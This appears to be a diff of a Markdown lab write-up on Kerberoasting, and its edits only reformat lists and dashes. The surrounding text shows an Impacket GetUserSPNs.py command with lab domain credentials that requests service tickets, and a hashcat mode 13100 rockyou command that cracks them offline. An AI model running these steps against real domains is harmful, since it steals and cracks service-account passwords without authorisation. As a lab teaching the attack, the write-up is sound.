@@ -30,15 +30,12 @@ Here is the problem — any logged-in domain user can request that ticket, no sp
 
 ## Objective
 
-- The goal of this assessment was to:
+- Identify service accounts with SPNs
+- Request Kerberos service tickets
+- Extract and analyze ticket data
+- Attempt offline password cracking
+- Evaluate security posture of service account password policy
 
-```
-Identify service accounts with SPNs
-Request Kerberos service tickets
-Extract and analyze ticket data
-Attempt offline password cracking
-Evaluate security posture of service account password policy
-```
 
 ## How Kerberoasting Works
 
@@ -69,16 +66,15 @@ Service Account Password Recovered
 | Kali Linux          | Attacker          | 192.168.5.128 |
 ```
 
-```
+
 I already have..
-Domain: readteambd.local
-User: rahimkhan
-Pass: Password1
-```
+- Domain: readteambd.local
+- User: rahimkhan
+- Pass: Password1
 
 ## Attack Process
 
-## Step 1 - Find Service Accounts
+## Step 1 – Find Service Accounts
 
 ```bash
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
@@ -126,7 +122,7 @@ Domain: READTEAMBD.local
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request -outputfile kerberoast.txt
 ```
 
-## Step 3 - Crack the Ticket
+## Step 3 – Crack the Ticket
 
 ```bash
 hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
